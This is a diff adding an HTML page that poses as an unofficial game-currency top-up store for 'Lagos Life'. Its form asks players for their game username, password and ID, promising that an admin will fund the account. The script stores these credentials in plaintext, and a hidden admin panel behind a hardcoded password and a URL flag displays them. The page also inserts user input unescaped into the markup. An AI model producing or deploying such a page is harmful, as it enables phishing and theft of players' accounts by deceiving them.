@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ADEMIDE OGO - LAGOS LIFE STORE</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
+body{background:#000;color:#fff}
+.top{border-bottom:1px solid #222;padding:14px 16px;display:flex;gap:10px;align-items:center}
+.logo{width:36px;height:36px;border:1px solid #c9a86a;color:#c9a86a;display:flex;align-items:center;justify-content:center;font-weight:bold}
+.hero{margin:16px;border:1px solid #333;border-radius:20px;padding:35px 20px;text-align:center}
+.hero small{color:#c9a86a;letter-spacing:3px}
+.circle{width:90px;height:90px;border:1px solid #c9a86a;border-radius:50%;margin:20px auto;display:flex;align-items:center;justify-content:center;font-size:50px;color:#c9a86a}
+.hero h1 span{color:#c9a86a}.hero p{color:#aaa;font-size:14px}
+.btn-gold{background:linear-gradient(90deg,#e8c47a,#c9a86a);color:#000;padding:15px;border:none;border-radius:10px;font-weight:bold;width:90%;margin-top:20px;cursor:pointer}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:16px}
+.pkg{border:1px solid #2a2a2a;background:#111;padding:20px 16px;border-radius:12px;text-align:center;cursor:pointer}
+.pkg h3{color:#e8c47a;font-size:22px;margin:6px 0}.pkg small{color:#c9a86a}
+.loginBox2{margin:16px;display:none}
+.loginCard{background:#1e293b;padding:28px;border-radius:16px}
+.loginCard h2{text-align:center}
+.packageBox{text-align:center;background:#334155;padding:12px;border-radius:10px;margin:16px 0 10px;font-weight:600;color:#38bdf8}
+input{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #333;background:#334155;color:#fff;font-size:16px}
+label{font-size:13px;color:#c9a86a}
+#adminPage{display:none;min-height:100vh;padding:20px}
+.adminBox{max-width:360px;margin:60px auto;background:#111;border:1px solid #333;border-radius:16px;padding:28px;text-align:center}
+.card{background:#111;border:1px solid #222;border-radius:12px;padding:16px;margin:12px auto;max-width:500px;text-align:left}
+</style>
+</head>
+<body>
+<div id="storePage">
+<div class="top"><div class="logo">AO</div><div><b>ADEMIDE OGO</b><br><span style="color:#c9a86a;font-size:12px">LAGOS LIFE STORE</span></div></div>
+<div class="hero"><small>UNOFFICIAL TOP-UP</small><div class="circle">₦</div><h1>Get <span>Game Naira</span><br>Fast</h1><p>Choose package, enter details, we go fund you</p><button class="btn-gold" onclick="document.getElementById('grid').scrollIntoView()">View Packages</button></div>
+<div style="text-align:center;padding:10px"><h2>Choose a <span style="color:#c9a86a">Package</span></h2></div>
+<div class="grid" id="grid"></div>
+<div class="loginBox2" id="loginPage">
+<div class="loginCard">
+<h2>Fund Your Lagos Life</h2>
+<div class="packageBox">Package: <span id="loginPkgName">1 Trillion</span> - <span id="loginPkgPrice">₦3,000</span></div>
+<label>LAGOS LIFE USERNAME</label>
+<input id="gameUser" placeholder="Enter username">
+<label>PASSWORD</label>
+<input id="gamePass" type="password" placeholder="Enter password">
+<label>LAGOS LIFE ID</label>
+<input id="gameID" placeholder="Enter your Lagos Life ID">
+<button class="btn-gold" style="width:100%" onclick="confirmLogin()">Submit Details</button>
+<button onclick="backToPackages()" style="width:100%;padding:10px;background:#334155;color:#fff;border:none;border-radius:8px;margin-top:8px;cursor:pointer">Back</button>
+<div id="successMsg" style="display:none;text-align:center;background:#166534;padding:16px;border-radius:10px;margin-top:16px">Details received! Admin will fund your account shortly.</div>
+</div>
+</div>
+<div style="text-align:center;padding:30px 16px 80px"><p style="color:#555;font-size:12px">ADEMIDE OGO STORE • FAST DELIVERY</p></div>
+</div>
+
+<div id="adminPage">
+<div class="adminBox" id="loginBox">
+<h1 style="color:#c9a86a">Admin Login</h1>
+<input type="password" id="pass" placeholder="Password">
+<button onclick="doLogin()" style="width:100%;padding:12px;background:#c9a86a;border:none;border-radius:8px;font-weight:bold;cursor:pointer">Enter</button>
+<button onclick="showStore()" style="width:100%;padding:12px;background:#222;color:#fff;border:none;border-radius:8px;margin-top:10px;cursor:pointer">Back to Store</button>
+</div>
+<div id="dashBox" style="display:none;max-width:500px;margin:0 auto">
+<h2 style="color:#c9a86a;text-align:center">ADEMIDE OGO — Admin</h2>
+<div class="card"><b style="color:#e8c47a">Orders:</b> <span id="totalOrders">0</span> <button onclick="clearOrders()" style="float:right;padding:5px 10px;background:#7f1d1d;color:#fff;border:none;border-radius:6px;cursor:pointer">Clear</button></div>
+<div class="card"><b style="color:#e8c47a">Orders - People wey wan fund</b><div id="orderList"></div></div>
+<div style="max-width:500px;margin:0 auto"><button onclick="showStore()" style="width:100%;padding:12px;background:#222;color:#fff;border:none;border-radius:8px;cursor:pointer">View Store</button></div>
+</div>
+</div>
+
+<script>
+var PKGS = [["50 Billion",200],["150 Billion",500],["300 Billion",1000],["500 Billion",2000],["1 Trillion",3000]];
+var curN="",curP=0;
+function renderStore(){
+  var g=document.getElementById('grid'); g.innerHTML='';
+  PKGS.forEach(function(p){
+    var d=document.createElement('div'); d.className='pkg';
+    d.innerHTML='<b>'+p[0]+'</b><h3>₦'+Number(p[1]).toLocaleString()+'</h3><small>TAP TO BUY</small>';
+    d.onclick=function(){
+      curN=p[0];curP=p[1];
+      document.getElementById('loginPkgName').innerText=p[0];
+      document.getElementById('loginPkgPrice').innerText='₦'+Number(p[1]).toLocaleString();
+      document.getElementById('successMsg').style.display='none';
+      document.getElementById('loginPage').style.display='block';
+      document.getElementById('loginPage').scrollIntoView({behavior:'smooth'});
+    };
+    g.appendChild(d);
+  });
+}
+function backToPackages(){document.getElementById('loginPage').style.display='none';}
+function getOrders(){ try{ return JSON.parse(localStorage.getItem('ademide_orders')||'[]'); }catch(e){ return []; } }
+function confirmLogin(){
+  var user=document.getElementById('gameUser').value.trim();
+  var pass=document.getElementById('gamePass').value.trim();
+  var gid=document.getElementById('gameID').value.trim();
+  if(!user || !pass || !gid){alert('Enter username, password and ID');return;}
+  var orders=getOrders();
+  orders.unshift({id:Date.now(), pkg:curN, price:curP, username:user, password:pass, gameID:gid, time:new Date().toLocaleString(), status:"Pending"});
+  localStorage.setItem('ademide_orders', JSON.stringify(orders));
+  document.getElementById('successMsg').style.display='block';
+}
+function showAdmin(){document.getElementById('storePage').style.display='none';document.getElementById('adminPage').style.display='block';window.scrollTo(0,0);}
+function showStore(){document.getElementById('adminPage').style.display='none';document.getElementById('storePage').style.display='block';document.getElementById('loginBox').style.display='block';document.getElementById('dashBox').style.display='none';}
+function doLogin(){
+  if(document.getElementById('pass').value==='ademide2026'){
+    document.getElementById('loginBox').style.display='none';document.getElementById('dashBox').style.display='block';
+    var orders=getOrders();
+    document.getElementById('totalOrders').innerText=orders.length;
+    document.getElementById('orderList').innerHTML=orders.length?orders.map(function(o){return '<div style="background:#222;padding:10px;border-radius:8px;margin:6px 0;font-size:13px"><b>'+o.pkg+' ₦'+Number(o.price).toLocaleString()+'</b> - '+o.status+'<br>Username: <b style="color:#e8c47a">'+o.username+'</b><br>Password: <b style="color:#e8c47a">'+(o.password||'')+'</b><br>ID: '+(o.gameID||'')+'<br>'+o.time+'</div>';}).join(''):'<p style="color:#888">No orders yet</p>';
+  } else alert('Wrong password');
+}
+function clearOrders(){ if(confirm('Clear all orders?')){ localStorage.removeItem('ademide_orders'); doLogin(); } }
+if(window.location.search.includes('admin=ademide')){ showAdmin(); }
+renderStore();
+</script>
+</body>
+                                                                        </html>
